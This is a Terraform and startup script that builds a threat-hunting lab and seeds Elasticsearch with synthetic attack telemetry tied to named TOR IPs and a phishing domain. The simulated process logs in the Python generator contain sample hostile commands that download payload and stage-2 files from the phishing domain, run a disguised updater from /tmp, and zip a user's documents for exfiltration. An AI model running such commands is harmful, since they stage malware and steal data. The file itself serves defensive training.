# ============================================================================
# Threat Hunting Lab 4 — IOC-Driven Hunt
# Terraform: 1x GCE VM running Elasticsearch + Kibana + Nginx Basic Auth
# Realistic synthetic telemetry for Elastic-based threat hunting lab
# Aligned with markdown IOCs:
#   - TOR IPs: 171.25.193.35, 193.189.100.204
#   - Phishing URL: https://rh.cloud-drive.services/
#   - Phishing domain: rh.cloud-drive.services
# ============================================================================

resource "random_id" "lab_suffix" {
  byte_length = 3
}

resource "random_password" "lab_pass" {
  length  = 18
  special = false
}

locals {
  suffix   = random_id.lab_suffix.hex
  lab_user = "lab-${local.suffix}"
  vm_name  = "thl-ioc-lab-${local.suffix}"
  fw_name  = "allow-http-thl-ioc-lab-${local.suffix}"
}

resource "google_compute_firewall" "allow_http" {
  name      = local.fw_name
  network   = "default"
  direction = "INGRESS"

  allow {
    protocol = "tcp"
    ports    = ["80"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["thl-ioc-lab"]
}

resource "google_compute_instance" "thl_ioc_lab" {
  name         = local.vm_name
  project      = var.gcp_project_id
  machine_type = "e2-standard-4"
  zone         = var.gcp_zone
  tags         = ["thl-ioc-lab"]

  depends_on = [google_compute_firewall.allow_http]

  boot_disk {
    initialize_params {
      image = "ubuntu-os-cloud/ubuntu-2204-lts"
      size  = 50
      type  = "pd-balanced"
    }
  }

  network_interface {
    network = "default"
    access_config {}
  }

  metadata_startup_script = <<-EOF
#!/usr/bin/env bash
set -euo pipefail

exec > >(tee -a /var/log/startup-script.log) 2>&1
echo "[+] Startup script begin: $(date -Is)"
trap 'echo "[!] ERROR at line $LINENO. Last command: $BASH_COMMAND"' ERR

export DEBIAN_FRONTEND=noninteractive
sleep 20

retry() {
  local n=0
  local max=12
  local delay=5
  until "$@"; do
    n=$((n+1))
    if [ "$n" -ge "$max" ]; then
      echo "[!] Command failed after $n attempts: $*"
      return 1
    fi
    echo "[!] Command failed: $*. Retrying in $${delay}s..."
    sleep "$delay"
  done
}

echo "[+] Updating apt"
retry apt-get update -y

LAB_USER="${local.lab_user}"
LAB_PASS="${random_password.lab_pass.result}"
echo "[+] Generated lab creds: $LAB_USER / (hidden)"

mkdir -p /opt/lab
chmod 755 /opt/lab
printf "Kibana Basic Auth\nUsername: %s\nPassword: %s\n" "$LAB_USER" "$LAB_PASS" > /opt/lab/creds.txt
chmod 600 /opt/lab/creds.txt

echo "[+] Installing dependencies"
retry apt-get install -y ca-certificates curl gnupg apache2-utils jq python3 python3-pip

echo "[+] Installing Docker Engine"
install -m 0755 -d /etc/apt/keyrings
retry bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg"
chmod a+r /etc/apt/keyrings/docker.gpg

cat >/etc/apt/sources.list.d/docker.list <<'DOCKERLIST'
deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu jammy stable
DOCKERLIST

retry apt-get update -y
retry apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
systemctl enable --now docker
docker --version
docker compose version

echo "[+] Preparing /opt/lab"
rm -rf /opt/lab/nginx /opt/lab/bulk /opt/lab/scripts || true
mkdir -p /opt/lab/nginx /opt/lab/bulk /opt/lab/scripts
chmod -R 755 /opt/lab
chmod -R 777 /opt/lab/bulk
cd /opt/lab

echo "[+] Creating htpasswd"
htpasswd -bc /opt/lab/nginx/.htpasswd "$LAB_USER" "$LAB_PASS"

echo "[+] Writing nginx.conf"
cat >/opt/lab/nginx/nginx.conf <<'NGINX'
events {}
http {
  upstream kibana_upstream {
    server kibana:5601;
  }

  server {
    listen 80;
    server_name _;

    auth_basic "Threat Hunting Lab";
    auth_basic_user_file /etc/nginx/.htpasswd;

    location / {
      proxy_pass http://kibana_upstream;
      proxy_http_version 1.1;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }
  }
}
NGINX

echo "[+] Writing compose.yaml"
cat >/opt/lab/compose.yaml <<'YAML'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.4
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms2g -Xmx2g
    volumes:
      - esdata:/usr/share/elasticsearch/data
    networks: [labnet]
    healthcheck:
      test: ["CMD-SHELL", "curl -s http://localhost:9200 >/dev/null || exit 1"]
      interval: 10s
      timeout: 5s
      retries: 30

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.4
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      elasticsearch:
        condition: service_healthy
    networks: [labnet]

  nginx:
    image: nginx:1.27-alpine
    depends_on: [kibana]
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/.htpasswd:/etc/nginx/.htpasswd:ro
    networks: [labnet]

networks:
  labnet:

volumes:
  esdata:
YAML

echo "[+] Starting stack"
docker compose -f /opt/lab/compose.yaml up -d
docker ps

echo "[+] Writing realistic dataset generator"
cat >/opt/lab/scripts/generate_bulk.py <<'PY'
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)

OUT_DIR = Path("/opt/lab/bulk")
OUT_DIR.mkdir(parents=True, exist_ok=True)

NOW = datetime.now(timezone.utc)
START = NOW - timedelta(days=7)

def iso(dt):
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def index_name(prefix, dt):
    return f"{prefix}-{dt.strftime('%Y.%m.%d')}"

def write_bulk(path, records):
    with path.open("w", encoding="utf-8") as f:
        for idx, doc in records:
            f.write(json.dumps({"index": {"_index": idx}}) + "\n")
            f.write(json.dumps(doc) + "\n")

def rand_dt():
    delta = NOW - START
    return START + timedelta(seconds=random.randint(0, int(delta.total_seconds())))

def random_sha():
    return "".join(random.choice("0123456789abcdef") for _ in range(64))

# -------------------------------------------------------------------
# IOC FEED aligned with markdown
# -------------------------------------------------------------------
IOC_IPS = ["171.25.193.35", "193.189.100.204"]
IOC_DOMAIN = "rh.cloud-drive.services"
IOC_URL = "https://rh.cloud-drive.services/"
IOC_HASH = "87f4b996f0ca6b937577109cb4b74ea7c6bd32bea76f38d938153176af5174a5"
IOC_OAUTH_CLIENT_ID = "8f19c2ab-ccda-4f72-91c0-1e5d3f58a9be"

# lower-confidence / partially related indicators
FALSE_IOC_IP = "34.160.22.10"
FALSE_IOC_DOMAIN = "updates-cdn-check.com"

AFFECTED_HOST = "WKSTN-044"
AFFECTED_USER = "bob@corp.com"
SERVICE_ACCOUNT = "ci-cd-sa@corp.com"

OTHER_HOSTS = ["WKSTN-019", "WKSTN-101", "SRV-APP-02", "SRV-FILES-01", "WKSTN-073"]
OTHER_USERS = ["alice@corp.com", "diane@corp.com", "eve@corp.com", "marc@corp.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/8.5.0",
    "python-requests/2.31.0",
]

GEO = {
    "24.48.123.11": ("Canada", "Montreal"),
    "99.230.11.7": ("Canada", "Toronto"),
    "142.112.88.9": ("Canada", "Quebec"),
    "70.50.146.28": ("Canada", "Beauharnois"),
    "34.95.10.22": ("Canada", "Ottawa"),
    "18.214.33.10": ("United States", "Ashburn"),
    "51.158.91.22": ("France", "Paris"),
    "185.220.101.1": ("Germany", "Frankfurt"),
    "91.198.174.192": ("Netherlands", "Amsterdam"),
    "171.25.193.35": ("Germany", "Berlin"),
    "193.189.100.204": ("Netherlands", "Amsterdam"),
    "34.160.22.10": ("United States", "Kansas City"),
}

IPS_CA = ["24.48.123.11", "99.230.11.7", "142.112.88.9", "70.50.146.28", "34.95.10.22"]
IPS_WORLD = ["18.214.33.10", "51.158.91.22", "185.220.101.1", "91.198.174.192"] + IOC_IPS + [FALSE_IOC_IP]

def geo(ip):
    country, city = GEO.get(ip, ("Unknown", "Unknown"))
    return {"country_name": country, "city_name": city}

# Timeline
t_domain_contact = NOW - timedelta(days=1, hours=6)
t_tor_callback = t_domain_contact + timedelta(minutes=3)
t_hash_exec = t_domain_contact + timedelta(minutes=37)
t_foreign_login = t_domain_contact + timedelta(minutes=52)
t_token_refresh = t_domain_contact + timedelta(minutes=60)
t_priv_esc = t_domain_contact + timedelta(minutes=64)
t_cloud_upload = t_domain_contact + timedelta(hours=2, minutes=15)

# -------------------------------------------------------------------
# network-flow-*
# -------------------------------------------------------------------
net_records = []

def net_doc(dt, src_host, src_ip, dst_ip=None, dst_domain=None, bytes_out=1200, bytes_in=900, user=None):
    doc = {
        "@timestamp": iso(dt),
        "event": {"dataset": "netflow", "action": "network_flow", "outcome": "success"},
        "network": {
            "direction": "outbound",
            "transport": random.choice(["tcp", "tcp", "tcp", "udp"]),
            "bytes": bytes_out + bytes_in
        },
        "source": {"ip": src_ip, "host": {"name": src_host}},
        "destination": {"ip": dst_ip, "domain": dst_domain},
        "source.bytes": bytes_out,
        "destination.bytes": bytes_in
    }
    if user:
        doc["user"] = {"email": user}
    return doc

normal_domains = [
    "updates.microsoft.com",
    "api.github.com",
    "dl.google.com",
    "storage.googleapis.com",
    "cdn.zoom.us",
    FALSE_IOC_DOMAIN
]

for _ in range(1800):
    dt = rand_dt()
    src_host = random.choice([AFFECTED_HOST] + OTHER_HOSTS)
    src_ip = random.choice(IPS_CA)
    dst_ip = random.choice(IPS_WORLD)
    dst_domain = random.choice(normal_domains + [None])
    bytes_out = random.choice([900, 1200, 2000, 4300, 9500, 18000])
    bytes_in = random.choice([700, 900, 1300, 2500, 5200, 9000])
    user = random.choice([AFFECTED_USER] + OTHER_USERS + [None])
    net_records.append((index_name("network-flow", dt), net_doc(dt, src_host, src_ip, dst_ip, dst_domain, bytes_out, bytes_in, user)))

# Phishing domain callbacks / staging traffic
for i in range(30):
    dt = t_domain_contact + timedelta(minutes=(i * 4) + random.choice([0, 1]))
    sub = random.choice(["rh", "login", "drive", "auth", "cdn"])
    dst_domain = f"{sub}.{IOC_DOMAIN}" if sub != "rh" else IOC_DOMAIN
    dst_ip = random.choice(IOC_IPS)
    bytes_out = random.choice([850, 980, 1100, 1250, 1400])
    bytes_in = random.choice([600, 750, 900, 1100])
    net_records.append((
        index_name("network-flow", dt),
        net_doc(dt, AFFECTED_HOST, "70.50.146.28", dst_ip, dst_domain, bytes_out, bytes_in, AFFECTED_USER)
    ))

# Repeated TOR-linked communications
for i in range(22):
    dt = t_tor_callback + timedelta(minutes=(i * 5) + random.choice([0, 1, 2]))
    dst_ip = random.choice(IOC_IPS)
    bytes_out = random.choice([900, 1100, 1400, 1800])
    bytes_in = random.choice([700, 900, 1200])
    net_records.append((
        index_name("network-flow", dt),
        net_doc(dt, AFFECTED_HOST, "70.50.146.28", dst_ip, IOC_DOMAIN, bytes_out, bytes_in, AFFECTED_USER)
    ))

# Exfil-ish traffic
for i in range(4):
    dt = t_cloud_upload - timedelta(minutes=20 - i * 4)
    net_records.append((
        index_name("network-flow", dt),
        net_doc(
            dt,
            AFFECTED_HOST,
            "70.50.146.28",
            random.choice(IOC_IPS),
            "partner-sync-dropbox",
            180000 + i * 22000,
            24000,
            AFFECTED_USER
        )
    ))

# -------------------------------------------------------------------
# dns-logs-*
# -------------------------------------------------------------------
dns_records = []

def dns_doc(dt, qname, src_host, src_ip, rcode="NOERROR"):
    return {
        "@timestamp": iso(dt),
        "event": {"dataset": "dns", "action": "dns_query", "outcome": "success"},
        "dns": {"question": {"name": qname}, "response_code": rcode},
        "source": {"ip": src_ip, "host": {"name": src_host}},
    }

common_domains = [
    "google.com",
    "microsoft.com",
    "github.com",
    "elastic.co",
    "cdn.zoom.us",
    "dl.google.com",
    FALSE_IOC_DOMAIN
]

for _ in range(2200):
    dt = rand_dt()
    src_host = random.choice([AFFECTED_HOST] + OTHER_HOSTS)
    src_ip = random.choice(IPS_CA)
    q = random.choice(common_domains)
    dns_records.append((index_name("dns-logs", dt), dns_doc(dt, q, src_host, src_ip)))

for i in range(90):
    dt = t_domain_contact + timedelta(minutes=(i * 3) + random.choice([0, 1]))
    sub = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(random.choice([8, 10, 12])))
    q = f"{sub}.{IOC_DOMAIN}"
    dns_records.append((index_name("dns-logs", dt), dns_doc(dt, q, AFFECTED_HOST, "70.50.146.28")))

# direct phishing-domain lookups
for i in range(12):
    dt = t_domain_contact + timedelta(minutes=i * 6)
    dns_records.append((index_name("dns-logs", dt), dns_doc(dt, IOC_DOMAIN, AFFECTED_HOST, "70.50.146.28")))

# -------------------------------------------------------------------
# auth-logs-*
# -------------------------------------------------------------------
auth_records = []

def auth_doc(dt, user, ip, outcome="success", action="login", device_name=None):
    return {
        "@timestamp": iso(dt),
        "event": {"dataset": "auth", "action": action, "outcome": outcome},
        "user": {"email": user},
        "source": {"ip": ip},
        "geo": geo(ip),
        "user_agent": {"original": random.choice(USER_AGENTS)},
        "device": {"name": device_name or random.choice([AFFECTED_HOST] + OTHER_HOSTS + ["VPN-GW-01"])},
    }

for _ in range(1200):
    dt = rand_dt()
    user = random.choice([AFFECTED_USER] + OTHER_USERS)
    ip = random.choice(IPS_CA)
    auth_records.append((index_name("auth-logs", dt), auth_doc(dt, user, ip, "success", "login")))

# suspicious foreign login before privilege change
auth_records.append((
    index_name("auth-logs", t_foreign_login),
    {
        **auth_doc(t_foreign_login, AFFECTED_USER, "193.189.100.204", "success", "login", AFFECTED_HOST),
        "rule": {"name": "suspicious_foreign_login_candidate"}
    }
))

# token refresh / session reuse
auth_records.append((
    index_name("auth-logs", t_token_refresh),
    {
        **auth_doc(t_token_refresh, AFFECTED_USER, "193.189.100.204", "success", "token_refresh", AFFECTED_HOST),
        "oauth": {"client_id": IOC_OAUTH_CLIENT_ID}
    }
))

# -------------------------------------------------------------------
# audit-logs-*
# -------------------------------------------------------------------
audit_records = []

def audit_doc(dt, actor, role, change, ip, action="setIamPolicy", target=None):
    return {
        "@timestamp": iso(dt),
        "event": {"dataset": "audit", "action": action, "outcome": "success"},
        "actor": {"email": actor},
        "iam": {"role": role, "change": change},
        "resource": {"type": "gcp_project", "name": "corp-prod"},
        "target": {"email": target or actor},
        "source": {"ip": ip},
        "geo": geo(ip),
    }

roles = [
    "roles/viewer",
    "roles/logging.viewer",
    "roles/compute.viewer",
    "roles/storage.objectViewer",
    "roles/editor",
    "roles/browser"
]

for _ in range(500):
    dt = rand_dt()
    actor = random.choice(["eve@corp.com", "admin2@corp.com", AFFECTED_USER])
    role = random.choice(roles)
    change = random.choice(["add", "remove"])
    ip = random.choice(IPS_CA)
    target = random.choice([AFFECTED_USER] + OTHER_USERS + [SERVICE_ACCOUNT])
    audit_records.append((index_name("audit-logs", dt), audit_doc(dt, actor, role, change, ip, "setIamPolicy", target)))

for role in ["roles/iam.serviceAccountTokenCreator", "roles/storage.admin"]:
    dt = t_priv_esc + timedelta(minutes=random.choice([0, 3, 5]))
    audit_records.append((
        index_name("audit-logs", dt),
        {
            **audit_doc(dt, AFFECTED_USER, role, "add", "193.189.100.204", "setIamPolicy", SERVICE_ACCOUNT),
            "rule": {"name": "privilege_escalation_candidate"}
        }
    ))

# -------------------------------------------------------------------
# workload-telemetry-*
# -------------------------------------------------------------------
workload_records = []

def workload_doc(dt, host, user, pname, cmd, parent, sha):
    return {
        "@timestamp": iso(dt),
        "event": {"dataset": "workload", "type": "start", "action": "process_start", "outcome": "success"},
        "host": {"name": host},
        "user": {"email": user},
        "process": {
            "name": pname,
            "command_line": cmd,
            "parent": {"name": parent},
            "hash": {"sha256": sha},
        },
        "file": {"hash": {"sha256": sha}},
    }

benign = [
    ("chrome", "/usr/bin/google-chrome --profile-directory=Default", "systemd"),
    ("python", "python3 -m http.server 8000", "bash"),
    ("backup-agent", "/usr/local/bin/backup-agent --run", "systemd"),
    ("sshd", "sshd: user@pts/0", "systemd"),
    ("curl", "curl https://dl.google.com/linux/linux_signing_key.pub", "bash"),
]

for _ in range(1400):
    dt = rand_dt()
    host = random.choice([AFFECTED_HOST] + OTHER_HOSTS)
    user = random.choice([AFFECTED_USER] + OTHER_USERS)
    pname, cmd, parent = random.choice(benign)
    workload_records.append((index_name("workload-telemetry", dt), workload_doc(dt, host, user, pname, cmd, parent, random_sha())))

# malicious execution
workload_records.append((
    index_name("workload-telemetry", t_hash_exec),
    {
        **workload_doc(
            t_hash_exec,
            AFFECTED_HOST,
            AFFECTED_USER,
            "onedriveupdater",
            f"/tmp/.update/onedriveupdater --url {IOC_URL}",
            "bash",
            IOC_HASH
        ),
        "rule": {"name": "ioc_hash_execution"}
    }
))

tool_chain = [
    ("curl", f"curl -fsSL {IOC_URL}payload.bin -o /tmp/.cache/payload.bin", "bash"),
    ("wget", f"wget https://{IOC_DOMAIN}/stage2.dat -O /tmp/.cache/stage2.dat", "bash"),
    ("python", "python3 /tmp/.cache/telemetry_sync.py --mode background", "bash"),
    ("zip", "zip -r /tmp/report_backup_2024_03.zip /home/bob/Documents", "bash"),
]

for i, (p, cmd, parent) in enumerate(tool_chain):
    dt = t_hash_exec + timedelta(minutes=5 + i * 7)
    workload_records.append((index_name("workload-telemetry", dt), workload_doc(dt, AFFECTED_HOST, AFFECTED_USER, p, cmd, parent, random_sha())))

# -------------------------------------------------------------------
# cloud-storage-*
# -------------------------------------------------------------------
cs_records = []

def cs_doc(dt, actor, obj, ip, bucket="corp-data-exchange"):
    return {
        "@timestamp": iso(dt),
        "event": {"dataset": "cloud_storage", "action": "storage.objects.insert", "outcome": "success"},
        "actor": {"email": actor},
        "object": {"name": obj},
        "source": {"ip": ip},
        "geo": geo(ip),
        "resource": {"type": "bucket", "name": bucket},
    }

for _ in range(400):
    dt = rand_dt()
    actor = random.choice([SERVICE_ACCOUNT, "backup-sa@corp.com", "reporting-sa@corp.com"])
    obj = f"reports/report-{random.randint(1000,9999)}.json"
    ip = random.choice(IPS_CA)
    cs_records.append((index_name("cloud-storage", dt), cs_doc(dt, actor, obj, ip)))

cs_records.append((
    index_name("cloud-storage", t_cloud_upload),
    {
        **cs_doc(t_cloud_upload, AFFECTED_USER, "finance_q1_review_backup.zip", "171.25.193.35", "partner-sync-dropbox"),
        "rule": {"name": "suspected_cloud_storage_exfil"}
    }
))

# -------------------------------------------------------------------
# Write BULK files
# -------------------------------------------------------------------
write_bulk(OUT_DIR / "network-flow.bulk.ndjson", net_records)
write_bulk(OUT_DIR / "dns-logs.bulk.ndjson", dns_records)
write_bulk(OUT_DIR / "auth-logs.bulk.ndjson", auth_records)
write_bulk(OUT_DIR / "audit-logs.bulk.ndjson", audit_records)
write_bulk(OUT_DIR / "workload-telemetry.bulk.ndjson", workload_records)
write_bulk(OUT_DIR / "cloud-storage.bulk.ndjson", cs_records)

print("BULK generated:")
for p in sorted(OUT_DIR.glob("*.ndjson")):
    print(" -", p, p.stat().st_size, "bytes")
PY

python3 /opt/lab/scripts/generate_bulk.py
ls -lh /opt/lab/bulk || true

ES_CID="$(docker ps --format '{{.ID}} {{.Names}}' | awk '$2 ~ /elasticsearch/ {print $1; exit}')"
if [ -z "$ES_CID" ]; then
  echo "[!] Could not find Elasticsearch container"
  docker ps
  exit 10
fi
echo "[+] Elasticsearch container ID: $ES_CID"

echo "[+] Waiting for Elasticsearch readiness"
for i in {1..240}; do
  if docker exec -i "$ES_CID" curl -s http://localhost:9200 >/dev/null 2>&1; then
    echo "[+] Elasticsearch is ready"
    break
  fi
  sleep 2
done

echo "[+] Bulk importing into Elasticsearch"
for f in /opt/lab/bulk/*.ndjson; do
  echo "[+] Loading $f ..."
  err=$(docker exec -i "$ES_CID" \
    curl -s -H "Content-Type: application/x-ndjson" \
    -XPOST "http://localhost:9200/_bulk?refresh=true" \
    --data-binary @- < "$f" | jq -r '.errors')
  echo "[+] errors=$err"
  if [[ "$err" != "false" ]]; then
    echo "[!] Bulk import returned errors for $f"
    exit 20
  fi
done

echo "[+] Verifying indices"
docker exec -i "$ES_CID" curl -s "http://localhost:9200/_cat/indices?v" || true

echo "[+] Waiting for Kibana API"
for i in {1..300}; do
  code=$(curl -s -u "$LAB_USER:$LAB_PASS" -o /dev/null -w "%%{http_code}" http://localhost/api/status || true)
  if [[ "$code" == "200" ]]; then
    echo "[+] Kibana API is ready"
    break
  fi
  sleep 2
done

create_data_view() {
  local name="$1"
  local pattern="$2"

  resp=$(curl -s -u "$LAB_USER:$LAB_PASS" -w "\n%%{http_code}\n" \
    -X POST "http://localhost/api/data_views/data_view" \
    -H "Content-Type: application/json" \
    -H "kbn-xsrf: true" \
    -d "{
      \"data_view\": {
        \"title\": \"$${pattern}\",
        \"name\": \"$${name}\",
        \"timeFieldName\": \"@timestamp\"
      }
    }")

  body=$(echo "$resp" | sed '$d')
  http=$(echo "$resp" | tail -n 1)

  if [[ "$http" == "200" || "$http" == "201" || "$http" == "409" ]]; then
    echo "[+] Data view OK: $${name} -> $${pattern} (HTTP=$http)"
    return 0
  fi

  echo "[!] Failed to create data view $${name} ($${pattern}) HTTP=$http"
  echo "$body" | head -n 120
  return 1
}

create_data_view "network-flow" "network-flow-*"
create_data_view "dns-logs" "dns-logs-*"
create_data_view "auth-logs" "auth-logs-*"
create_data_view "audit-logs" "audit-logs-*"
create_data_view "workload-telemetry" "workload-telemetry-*"
create_data_view "cloud-storage" "cloud-storage-*"

echo "[+] Listing data views"
curl -s -u "$LAB_USER:$LAB_PASS" -H "kbn-xsrf: true" http://localhost/api/data_views \
  | jq -r '.data_view[] | "\(.name) -> \(.title)"' || true

echo "[+] Startup script completed successfully: $(date -Is)"
EOF
}